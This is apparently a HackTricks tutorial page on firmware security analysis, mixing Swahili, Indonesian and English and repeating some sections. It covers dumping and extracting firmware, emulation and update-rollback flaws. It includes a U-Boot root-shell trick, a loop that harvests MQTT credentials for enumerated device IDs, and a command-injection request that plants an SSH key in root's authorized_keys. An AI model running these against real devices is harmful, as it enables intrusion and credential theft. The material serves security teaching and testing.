# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni software muhimu inayowezesha devices kufanya kazi kwa usahihi kwa kusimamia na kuwezesha mawasiliano kati ya hardware components na software ambayo watumiaji huingiliana nayo. Huhifadhiwa kwenye permanent memory, kuhakikisha device inaweza kufikia maelekezo muhimu tangu inapowashwa, na hivyo kusababisha kuanzishwa kwa operating system. Kuchunguza na huenda kurekebisha firmware ni hatua muhimu katika kutambua security vulnerabilities.

## **Gathering Information**

**Gathering information** ni hatua ya awali muhimu katika kuelewa muundo wa device na teknolojia zinazotumia. Mchakato huu unahusisha kukusanya data kuhusu:

- CPU architecture na operating system inayoiendesha
- Bootloader specifics
- Hardware layout na datasheets
- Codebase metrics na source locations
- External libraries na license types
- Update histories na regulatory certifications
- Architectural na flow diagrams
- Security assessments na identified vulnerabilities

Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** ni muhimu sana, kama ilivyo uchambuzi wa sehemu zozote za open-source software zinazopatikana kupitia manual na automated review processes. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa static analysis ya bure ambayo inaweza kutumiwa kupata potential issues.

## **Acquiring the Firmware**

Kupata firmware kunaweza kufanywa kwa njia mbalimbali, kila moja ikiwa na kiwango chake cha complexity:

- **Directly** kutoka kwenye source (developers, manufacturers)
- **Building** kutoka kwenye instructions zilizotolewa
- **Downloading** kutoka kwenye official support sites
- Kutumia **Google dork** queries kutafuta hosted firmware files
- Kufikia **cloud storage** moja kwa moja, kwa zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kukamata **updates** kupitia man-in-the-middle techniques
- **Extracting** kutoka kwenye device kupitia connections kama **UART**, **JTAG**, au **PICit**
- **Sniffing** update requests ndani ya device communication
- Kutambua na kutumia **hardcoded update endpoints**
- **Dumping** kutoka kwenye bootloader au network
- **Removing and reading** storage chip, inaposhindikana vingine vyote, kwa kutumia hardware tools zinazofaa

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.

## Analyzing the firmware

Now that you **have the firmware**, you need to extract information about it to know how to treat it. Different tools you can use for that:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ikiwa huoni mengi kwa kutumia zana hizo, angalia **entropy** ya picha kwa `binwalk -E <bin>`, ikiwa ni entropy ya chini, basi huenda haijasimbwa kwa njia fiche. Ikiwa ni entropy ya juu, huenda imesimbwa kwa njia fiche (au imebanwa kwa njia fulani).

Zaidi ya hayo, unaweza kutumia zana hizi kutoa **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) ili kukagua file.

### Getting the Filesystem

Kwa kutumia zana zilizotajwa hapo awali kama `binwalk -ev <bin>` unapaswa kuwa umeweza **kutoa filesystem**.\
Binwalk kawaida hui-extract ndani ya **folder inayoitwa kwa aina ya filesystem**, ambayo kwa kawaida ni mojawapo ya zifuatazo: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Wakati mwingine, binwalk **haitakuwa na magic byte ya filesystem katika signatures zake**. Katika hali hizi, tumia binwalk ili **kupata offset ya filesystem na carve the compressed filesystem** kutoka kwenye binary na **ku-extract manually** filesystem kulingana na aina yake kwa kutumia hatua zilizo hapa chini.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Endesha amri ifuatayo ya **dd command** ili kuchonga filesystem ya Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Vinginevyo, amri ifuatayo pia inaweza kuendeshwa.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (inayotumika katika mfano hapo juu)

`$ unsquashfs dir.squashfs`

Faili zitakuwa kwenye saraka "`squashfs-root`" baadaye.

- Faili za kumbukumbu ya CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa mifumo ya faili ya jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa mifumo ya faili ya ubifs yenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Kuchambua Firmware

Firmware ikishapatikana, ni muhimu kuichambua ili kuelewa muundo wake na udhaifu unaowezekana. Mchakato huu unahusisha kutumia zana mbalimbali kuchambua na kutoa data yenye thamani kutoka kwenye picha ya firmware.

### Zana za Uchambuzi wa Awali

Seti ya amri imetolewa kwa ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchambua data ya binary, na kuelewa maelezo ya partition na filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Ili kutathmini hali ya usimbaji wa picha, **entropy** hukaguliwa kwa `binwalk -E <bin>`. Entropy ya chini huashiria kukosekana kwa usimbaji, ilhali entropy ya juu huonyesha uwezekano wa usimbaji au compression.

Kwa ajili ya kutoa **embedded files**, zana na rasilimali kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** kwa ukaguzi wa faili hupendekezwa.

### Extracting the Filesystem

Kwa kutumia `binwalk -ev <bin>`, kwa kawaida mtu anaweza kutoa filesystem, mara nyingi ndani ya directory inayoitwa kwa jina la aina ya filesystem (kwa mfano, squashfs, ubifs). Hata hivyo, wakati **binwalk** inashindwa kutambua aina ya filesystem kutokana na kukosekana kwa magic bytes, manual extraction inahitajika. Hii inahusisha kutumia `binwalk` kupata offset ya filesystem, kisha amri ya `dd` ili kuchonga filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Setelah itu, bergantung pada jenis filesystem (mis., squashfs, cpio, jffs2, ubifs), perintah yang berbeda digunakan untuk mengekstrak isi secara manual.

### Analisis Filesystem

Setelah filesystem diekstrak, pencarian celah keamanan dimulai. Perhatian diberikan pada network daemons yang tidak aman, kredensial hardcoded, API endpoints, fungsi update server, code yang belum dikompilasi, startup scripts, dan binary yang sudah dikompilasi untuk analisis offline.

**Lokasi utama** dan **item** yang perlu diperiksa meliputi:

- **etc/shadow** dan **etc/passwd** untuk kredensial user
- Sertifikat dan kunci SSL di **etc/ssl**
- File konfigurasi dan script untuk potensi kerentanan
- Embedded binaries untuk analisis lebih lanjut
- Web server dan binaries umum pada perangkat IoT

Beberapa tools membantu mengungkap informasi sensitif dan kerentanan di dalam filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) dan [**Firmwalker**](https://github.com/craigz28/firmwalker) untuk pencarian informasi sensitif
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) untuk analisis firmware menyeluruh
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), dan [**EMBA**](https://github.com/e-m-b-a/emba) untuk analisis statis dan dinamis

### Pemeriksaan Keamanan pada Binary yang Sudah Dikompilasi

Baik source code maupun binary yang sudah dikompilasi yang ditemukan di filesystem harus diperiksa dengan cermat untuk kerentanan. Tools seperti **checksec.sh** untuk binary Unix dan **PESecurity** untuk binary Windows membantu mengidentifikasi binary yang tidak terlindungi dan dapat dieksploitasi.

## Mengambil config cloud dan kredensial MQTT melalui token URL turunan

Banyak hub IoT mengambil konfigurasi per-device mereka dari cloud endpoint yang terlihat seperti:

- `https://<api-host>/pf/<deviceId>/<token>`

Selama analisis firmware, Anda mungkin menemukan bahwa `<token>` diturunkan secara lokal dari device ID menggunakan secret yang di-hardcode, misalnya:

- token = MD5( deviceId || STATIC_KEY ) dan direpresentasikan sebagai hex huruf besar

Desain ini memungkinkan siapa pun yang mengetahui deviceId dan STATIC_KEY untuk merekonstruksi URL dan mengambil cloud config, yang sering kali mengungkap kredensial MQTT dalam plaintext dan prefix topic.

Alur kerja praktis:

1) Ekstrak deviceId dari log boot UART

- Hubungkan adapter UART 3.3V (TX/RX/GND) dan tangkap log:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Tafuta mistari inayochapisha muundo wa URL ya cloud config na anwani ya broker, kwa mfano:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Rejesha STATIC_KEY na token algorithm kutoka firmware

- Pakia binaries ndani ya Ghidra/radare2 na tafuta config path ("/pf/") au MD5 usage.
- Thibitisha algorithm (mfano, MD5(deviceId||STATIC_KEY)).
- Toa token ndani ya Bash na fanya digest iwe uppercase:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Vuna cloud config na MQTT credentials

- Tengeneza URL na kuvuta JSON kwa kutumia curl; changanua kwa kutumia jq ili kutoa secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Tumia vibaya MQTT ya maandishi wazi na ACL dhaifu za topiki (kama zipo)

- Tumia credentials zilizopatikana kujiandikisha kwenye maintenance topics na utafute sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Orodhesha device IDs zinazotabirika (kwa kiwango kikubwa, kwa idhini)

- Mifumo mingi hujumuisha vendor OUI/product/type bytes zikifuatiwa na sequential suffix.
- Unaweza ku-iterate candidate IDs, derive tokens na fetch configs kwa programmatically:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Daima pata idhini ya wazi kabla ya kujaribu enumeration ya wingi.
- Pendelea emulation au static analysis ili kurejesha secrets bila kurekebisha hardware ya target inapowezekana.


Mchakato wa emulating firmware huwezesha **dynamic analysis** ama ya uendeshaji wa device au programu ya mtu binafsi. Njia hii inaweza kukutana na changamoto za hardware au utegemezi wa architecture, lakini kuhamisha root filesystem au binaries mahususi kwenda kwenye device yenye architecture na endianness inayolingana, kama Raspberry Pi, au kwenda kwenye pre-built virtual machine, kunaweza kurahisisha majaribio zaidi.

### Emulating Individual Binaries

Kwa kuchunguza programu moja moja, kutambua endianness ya programu na CPU architecture ni muhimu.

#### Example with MIPS Architecture

Ili emulate binary ya MIPS architecture, unaweza kutumia amri:
```bash
file ./squashfs-root/bin/busybox
```
Na kusakinisha zana muhimu za emulation:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Kwa MIPS (big-endian), `qemu-mips` inatumika, na kwa binaries za little-endian, `qemu-mipsel` ndiyo chaguo.

#### ARM Architecture Emulation

Kwa binaries za ARM, mchakato ni sawa, na emulator ya `qemu-arm` inatumika kwa emulation.

### Full System Emulation

Zana kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyingine, huwezesha full firmware emulation, zikifanyia mchakato automatisation na kusaidia katika dynamic analysis.

## Dynamic Analysis in Practice

Katika hatua hii, mazingira ya kifaa halisi au yaliyotolewa kwa emulation hutumiwa kwa analysis. Ni muhimu kudumisha shell access kwa OS na filesystem. Emulation huenda isifanane kikamilifu na mwingiliano wa hardware, hivyo mara kwa mara inaweza kuhitaji kuanzishwa upya. Analysis inapaswa kurudi tena kwenye filesystem, kutumia webpages na network services zilizo wazi, na kuchunguza bootloader vulnerabilities. Firmware integrity tests ni muhimu ili kutambua uwezekano wa backdoor vulnerabilities.

## Runtime Analysis Techniques

Runtime analysis inahusisha kuingiliana na process au binary katika mazingira yake ya uendeshaji, kwa kutumia zana kama gdb-multiarch, Frida, na Ghidra kwa kuweka breakpoints na kutambua vulnerabilities kupitia fuzzing na techniques nyingine.

Kwa embedded targets zisizo na debugger kamili, **nakili `gdbserver` iliyounganishwa kwa static** kwenye kifaa na uiambatishe kwa mbali:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

Katika IoT hubs, RF stack mara nyingi hugawanywa kati ya **radio MCU** na mchakato wa Linux userland. Workflow muhimu ni ku-map njia:

1. **RF frame** hewani
2. **controller-side parser** kwenye radio MCU
3. **serial/UART text or TLV protocol** inayosambazwa kwenda Linux (kwa mfano `/dev/tty*`)
4. **application dispatcher** kwenye main daemon
5. **protocol-specific handler / state machine**

Usanifu huu huunda targets mbili za reversing badala ya moja. Kama controller inabadilisha binary radio frames kuwa protocol ya maandishi kama `Group,Command,arg1,arg2,...`, recover:

- **message groups** na dispatch tables
- Ni messages gani zinaweza kutoka kwenye **network** dhidi ya controller yenyewe
- Fields sahihi za **manufacturer-specific discriminator** (kwa mfano Zigbee `manufacturer_code` na custom `cluster_command`)
- Ni handlers gani zinafikiwa tu wakati wa **commissioning**, discovery, au firmware/model download phases

Kwa Zigbee specifically, capture pairing traffic na uangalie kama target bado inategemea default **Link Key** `ZigBeeAlliance09`. Kama ndivyo, sniffing commissioning traffic inaweza kufichua **Network Key**. Zigbee 3.0 install codes hupunguza exposure hii, hivyo angalia kama kifaa kilichojaribiwa kweli kinaforce hizo.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands mara nyingi ni target bora kuliko standardized clusters kwa sababu huingiza **custom parsing code** na internal **FSMs** zenye validation isiyo battle-tested sana.

Practical workflow:

- Reverse command dispatcher hadi upate **vendor-only handler**.
- Recover **FSM state**, **event**, **check**, **action**, na **next-state** tables.
- Tambua **transitional states** zinazo-auto-advance na retry/error branches ambazo hatimaye hu-reset au ku-free state inayodhibitiwa na attacker.
- Thibitisha ni protocol exchanges zipi halali zinahitajika kuweka daemon katika vulnerable state badala ya kudhani buggy handler inapatikana kila wakati.

Kwa protocols zinazohisi timing, packet replay kutoka Python framework inaweza kuwa slow sana. Njia ya kuaminika zaidi ni ku-emulate kifaa halali kwenye hardware halisi (kwa mfano **nRF52840**) na vendor-grade stack ili uweze ku-expose **endpoints**, **attributes**, na commissioning timing sahihi.

### Fragmented-download bug class in embedded daemons

Bug class ya firmware inayojirudia huonekana kwenye **fragmented blob/model/configuration downloads**:

1. **first fragment** (`offset == 0`) huhifadhi `ctx->total_size` na hu-allocate `malloc(total_size)`.
2. Fragment zinazofuata hu-validate tu fields za **packet-local** zinazosimamiwa na attacker kama `packet_total_size >= offset + chunk_len`.
3. Copy hutumia `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bila ku-check dhidi ya **original allocated size**.

Hii humruhusu attacker kutuma:

- Fragment ya kwanza halali yenye declared total size **ndogo** ili kulazimisha small heap allocation.
- Fragment ya baadaye yenye **expected offset** lakini `chunk_len` kubwa zaidi.
- Forged packet-local size inayokidhi fresh checks ilhali bado inafurika buffer iliyotengwa awali.

Wakati vulnerable path iko nyuma ya commissioning logic, exploitation lazima ijumuishe **device emulation** ya kutosha kupeleka target kwenye expected model-download au blob-download state kabla ya kutuma malformed fragments.

### Protocol-driven `free()` triggers

Katika embedded daemons, njia rahisi zaidi ya ku-trigger heap metadata exploitation mara nyingi si "subiri cleanup" bali ni **lazimisha protocol's own error handling**:

- Tuma malformed follow-up fragments kupeleka FSM kwenye **retry** au **error** states.
- Vuka retry threshold ili daemon **ireset context** na i-free corrupted buffer.
- Tumia hii predictable `free()` ku-trigger allocator-side primitives kabla process haijaharibika kwa sababu zisizohusiana.

Hii ni muhimu hasa dhidi ya **musl/uClibc/dlmalloc-like** allocators kwenye embedded Linux, ambapo ku-corrupt chunk metadata kunaweza kugeuza unlink/unbin logic kuwa write primitive. Pattern thabiti ni ku-corrupt **size field** ili kuelekeza allocator traversal kwenye **fake chunks staged inside the overflowed buffer**, badala ya mara moja ku-clobber real bin pointers na kufanya process crash.

## Binary Exploitation and Proof-of-Concept

Kukuza PoC kwa vulnerabilities vilivyotambuliwa kunahitaji uelewa wa kina wa target architecture na programming katika lower-level languages. Binary runtime protections kwenye embedded systems ni adimu, lakini zikikuwepo, techniques kama Return Oriented Programming (ROP) zinaweza kuhitajika.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc hutumia fastbins sawa na glibc. Later large allocation inaweza ku-trigger `__malloc_consolidate()`, hivyo fake chunk yoyote lazima ipite checks (sane size, `fd = 0`, na surrounding chunks kuonekana kama "in use").
- **Non-PIE binaries under ASLR:** kama ASLR imewezeshwa lakini main binary ni **non-PIE**, in-binary `.data/.bss` addresses ni thabiti. Unaweza kulenga region ambayo tayari inaonekana kama valid heap chunk header ili kutua fastbin allocation kwenye **function pointer table**.
- **Parser-stopping NUL:** JSON inapoparswa, `\x00` kwenye payload inaweza kusimamisha parsing huku ikihifadhi trailing attacker-controlled bytes kwa stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain inayaita `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kupandikiza executable shellcode kwenye known mapping na kurukia humo.

## Prepared Operating Systems for Firmware Analysis

Operating systems kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa environments zilizosanidiwa awali kwa firmware security testing, zikiwa na tools muhimu.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyokusudiwa kukusaidia kufanya security assessment na penetration testing ya Internet of Things (IoT) devices. Inakuokoa muda mwingi kwa kutoa environment iliyosanidiwa awali yenye tools zote muhimu zimepakiwa.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 iliyopakiwa awali na firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Hata vendor anapotekeleza cryptographic signature checks kwa firmware images, **version rollback (downgrade) protection mara nyingi huachwa**. Wakati boot- au recovery-loader inathibitisha tu signature kwa embedded public key lakini haikulinganisha *version* (au monotonic counter) ya image inayoflashedwa, attacker anaweza kusakinisha kihalali **older, vulnerable firmware ambayo bado ina valid signature** na hivyo kurudisha vulnerabilities ambazo tayari zilipatchwa.

Typical attack workflow:

1. **Obtain an older signed image**
* Ipakue kutoka vendor’s public download portal, CDN au support site.
* Itoe kutoka companion mobile/desktop applications (kwa mfano ndani ya Android APK chini ya `assets/firmware/`).
* Irejeshe kutoka third-party repositories kama VirusTotal, Internet archives, forums, n.k.
2. **Upload or serve the image to the device** kupitia exposed update channel yoyote:
* Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
* Vielelezo vingi vya consumer IoT devices hutoa *unauthenticated* HTTP(S) endpoints zinazopokea Base64-encoded firmware blobs, huzidecode server-side na ku-trigger recovery/upgrade.
3. Baada ya downgrade, exploit vulnerability ambalo lilipatchwa kwenye release mpya zaidi (kwa mfano command-injection filter iliyoongezwa baadaye).
4. Hiari, flash image ya hivi karibuni tena au disable updates ili kuepuka detection mara persistence inapopatikana.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Katika firmware iliyo hatarini (iliyoshushwa toleo), parameter ya `md5` inaunganishwa moja kwa moja kwenye shell command bila sanitisation, hivyo kuruhusu injection ya arbitrary commands (hapa – kuwezesha SSH key-based root access). Matoleo ya baadaye ya firmware yaliingiza basic character filter, lakini kukosekana kwa downgrade protection kunafanya fix hiyo kuwa moot.

### Extracting Firmware From Mobile Apps

Wachuuzi wengi huweka full firmware images ndani ya companion mobile applications zao ili app iweze kusasisha device kupitia Bluetooth/Wi-Fi. Packages hizi kwa kawaida huhifadhiwa bila encryption ndani ya APK/APEX chini ya paths kama `assets/fw/` au `res/raw/`. Tools kama `apktool`, `ghidra`, au hata plain `unzip` huruhusu kuchota signed images bila kugusa physical hardware.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Updater-only anti-rollback bypass in A/B slot designs

Baadhi ya vendors huteua anti-downgrade **ratchet**, lakini ndani tu ya mantiki ya *updater* (kwa mfano UDS routine juu ya CAN, recovery command, au userspace OTA agent). Ikiwa **bootloader** baadaye hukagua tu image signature/CRC na kuamini partition table au slot metadata, rollback protection bado inaweza kupitwa.

Muundo dhaifu wa kawaida:

- Firmware metadata ina zote version descriptor na **security ratchet** / monotonic counter.
- Updater hulinganisha image ratchet dhidi ya thamani iliyohifadhiwa kwenye persistent storage na hukataa older signed images.
- Bootloader haichambui ratchet hiyo na hukagua tu header, CRC, na signature kabla ya booting slot iliyochaguliwa.
- Slot activation huhifadhiwa kando katika partition table au per-slot generation counter na **haijafungwa kiptografia** kwa exact firmware digest iliyothibitishwa.

Hii hutengeneza primitive ya **validate-one-image / boot-another-image** katika dual-slot systems. Ikiwa mshambuliaji anaweza kufanya updater i-mark slot B kama next boot target kwa kutumia current signed image, na baadaye aka-overwrite slot B kabla ya reboot, bootloader bado inaweza boot downgraded image kwa sababu inaamini tu tayari-committed slot metadata.

Common abuse pattern:

1. Upload **current signed** firmware kwenye passive slot na endesha normal validation/switch routine ili layout i-mark slot hiyo kama next active.
2. **Usireboot bado**. Ingia tena kwenye slot-preparation/erase routine katika session hiyo hiyo.
3. Tumia stale boot-state au stale slot-selection logic vibaya ili updater ifute **same physical slot** ambayo ilipandishwa muda mfupi uliopita.
4. Andika **older but still signed** firmware kwenye slot hiyo.
5. Ruka validation routine inayolazimisha ratchet na reboot moja kwa moja.
6. Bootloader huchagua promoted slot, hukagua tu signature/integrity, na hu-boot old image.

Mambo ya kuangalia unaporeverse A/B update implementations:

- Slot selection inayotokana na **boot-time flags** ambazo hazis refreshed baada ya successful switch.
- `prepare_passive_slot()`-style routine inayofuta slot kwa kutegemea stale state badala ya **current committed layout**.
- `part_write_layout()`-style function inayoongeza tu **generation counter** / active flag na haihifadhi validated image hash.
- Ratchet checks zilizotekelezwa kwenye userspace au updater code, lakini **sio** kwenye ROM / bootloader / secure boot stages.
- Erase au recovery routines zinazoacha slot ikiwa marked kama bootable hata baada ya content yake kuondolewa na kuandikwa upya.

### Checklist for Assessing Update Logic

* Is transport/authentication ya *update endpoint* imehifadhiwa vya kutosha (TLS + authentication)?
* Je, device hulinganisha **version numbers** au **monotonic anti-rollback counter** kabla ya flashing?
* Je, image huverified ndani ya secure boot chain (kwa mfano signatures hukaguliwa na ROM code)?
* Je, **bootloader enforces the same ratchet** kama updater, badala ya kukagua signature/CRC tu?
* Je, slot activation metadata **imefungwa kwa validated firmware digest/version**, au slot inaweza kubadilishwa baada ya promotion?
* Baada ya slot switch kufanikiwa, je, device inalazimishwa reboot au later update/erase routines bado zinaweza kufikiwa katika session hiyo hiyo?
* Je, userland code hufanya sanity checks za ziada (kwa mfano allowed partition map, model number)?
* Je, *partial* au *backup* update flows zinatumia tena same validation logic?

> 💡  Ikiwa yoyote kati ya hapo juu haipo, platform pengine iko vulnerable kwa rollback attacks.

## Vulnerable firmware to practice

Ili kujifunza kugundua vulnerabilities katika firmware, tumia projects zifuatazo za vulnerable firmware kama starting point.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
